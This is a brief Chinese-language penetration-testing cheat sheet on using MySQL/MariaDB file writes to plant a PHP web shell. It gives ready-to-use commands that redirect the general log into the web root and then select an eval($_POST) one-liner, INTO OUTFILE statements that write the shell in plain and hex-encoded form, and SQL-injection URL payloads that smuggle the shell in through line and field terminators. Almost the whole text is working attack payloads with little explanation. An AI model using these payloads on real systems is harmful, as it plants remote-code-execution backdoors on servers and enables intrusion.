----

# 写文件

## 利用log写入

​	MariaDB10.0.32

​	secure_file_priv= 

> show global variable like '%general%';
>
> set global general_log=on;
>
> set global_log_file='var/www/html/i.php' #MySQL要有i.php的写入权限
>
>  select '<?php eval($_POST["c"]);?>';

## outfile

mysql有写入权限，知道物理路径，secure_file_priv允许访问目录

>  select '<?php eval($_POST["c"]);?>' into outfile '/var/www/html/e.php';
>
> select 0x3c3f706870206576616c28245f504f53545b2263225d293b3f3e into outfile '/var/www/html/e.php';

## 分隔符

> ?id=1 INTO OUTFILE '物理路径' lines terminated by (一句话hex编码)
>
> ?id=1 INTO OUTFILE '物理路径' fields terminated by (一句话hex编码)
>
> ?id=1 INTO OUTFILE '物理路径' columns terminated by (一句话hex编码)
>
> ?id=1 INTO OUTFILE '物理路径' lines starting by (一句话hex编码)